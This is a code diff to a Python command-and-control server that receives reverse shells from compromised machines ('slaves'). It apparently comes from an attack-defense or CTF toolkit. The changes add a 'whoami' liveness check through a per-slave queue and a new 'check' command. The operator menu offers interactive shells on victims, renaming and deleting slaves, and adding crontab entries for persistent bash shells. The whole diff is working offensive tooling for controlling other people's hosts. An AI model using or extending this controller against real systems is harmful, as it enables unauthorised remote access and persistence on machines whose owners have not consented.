@@ -15,6 +15,7 @@ import re
 import string
 import random
 import base64
+import queue
 
 
 MAX_CONNECTION_NUMBER = 16
@@ -23,6 +24,7 @@ slaves = {}
 interactive_slave = None
 interactive_state = 'common_rec'
 interactive_user = None
+check_state = False
 
 
 # 每个slave一把锁lock
@@ -49,6 +51,7 @@ class Slave(object):
         self.hostname, self.port = socket_fd.getpeername()
         self.node_hash = node_hashs(self.hostname, self.port)
         self.interactive = False
+        self.checkQueue = queue.Queue()
         self.first_connect_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     def rename(self, name):
@@ -57,16 +60,17 @@ class Slave(object):
     def getinfo(self):
         return self.name, self.hostname, self.port, self.first_connect_time
 
-    def slave_rec(self):
+    # 统一管理slave返回信息
+    def manage_slave_rec(self):
         lock = locks[self.node_hash]
         lock.acquire()
         # 接受被控shell信息发送给用户
         try:
             while True:
-                buf = b''
                 if EXIT_FLAG:
                     break
                 while True:
+                    buf = b''
                     try:
                         rec = self.socket_fd.recv(2048)
                         buf += rec
@@ -76,12 +80,19 @@ class Slave(object):
                         break
                 if buf == b'':
                     break
+                #print(buf, check_state)
+                if check_state:
+
+                    #print('Its time to check')
+                    self.checkQueue.put(buf)
+                    continue
                 try:
                     if buf:
                         if interactive_state == 'interactive_state' and interactive_slave == self:
                             bufss = str(buf, encoding="utf-8")
                             fd_send(interactive_user, bufss)
                         elif interactive_state == 'common_rec' or interactive_slave != self:
+                            # print('Its time to log')
                             t = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S ")
                             path = './log/' + t + self.hostname + ' : ' + str(self.port) + '.log'
                             if [path, datetime.datetime.now()] not in recent:
@@ -212,17 +223,22 @@ def random_string(length, chars):
 
 def check_online_slave():
     l = []
+    global check_state
+    check_state = True
     for key in slaves.keys():
         try:
-            msg = '\n'
+            msg = 'whoami\n'
             fd_send(slaves[key].socket_fd, msg)
             fd_send(slaves[key].socket_fd, msg)
-        except socket.error:
+            buf = slaves[key].checkQueue.get(timeout=5)
+            server_log(buf)
+        except Exception as e:
             server_log(traceback.format_exc())
             l.append(key)
 
     for key in l:
         slaves.pop(key)
+    check_state = False
 
 
 def transfer2user(user_fd, mod, **kwargs):
@@ -242,6 +258,7 @@ def transfer2user(user_fd, mod, **kwargs):
                 Log.error(msg, user_fd)
             Log.command('>>>', user_fd)
         buf = user_fd.recv(2048)
+        #print(buf)
         if buf == b'':
             break
         if buf:
@@ -274,8 +291,9 @@ def transfer2user(user_fd, mod, **kwargs):
                         break
             elif mod == 'Control_Command':
                 if command == 'show\n' or command == 's\n':
-                    check_online_slave()
                     print_salve(user_fd)
+                elif command == 'check\n' or command == 'ck\n':
+                    check_online_slave()
                 elif command == '\n':
                     continue
                 elif command == 'recent\n' or command == 'r\n':
@@ -452,12 +470,13 @@ def recent_log(user_fd):
 
 
 def print_command(user_fd):
-    msg = '''    [show] : show all slave
+    msg = '''    [show/s] : show all slave
     [i] : open a interactive shell (after choose)
     [del] : delete the slave (after choose)
-    [choose] : choose a slave
+    [choose/c] : choose a slave
     [name xxxx] : rename a slave (after choose)
-    [recent] : To print Recent connect log
+    [check/ck] : check all slave alive
+    [recent/r] : To print Recent connect log
     [add xxxx] : add crontab, if not xxxx then default bash shell (after choose)
     [exit] : exit\n'''
     Log.info(msg, user_fd)
@@ -482,7 +501,7 @@ def master(port):
         now = datetime.datetime.now()
         connections.append([slave.hostname, str(slave.port), now])
         log_save(slave_fd, interactive_user)
-        t = threading.Thread(target=slave.slave_rec)
+        t = threading.Thread(target=slave.manage_slave_rec)
         t.start()
         try:
             msg = '\nSlave %s : %d is Online!\n' % (slave.hostname, slave.port)
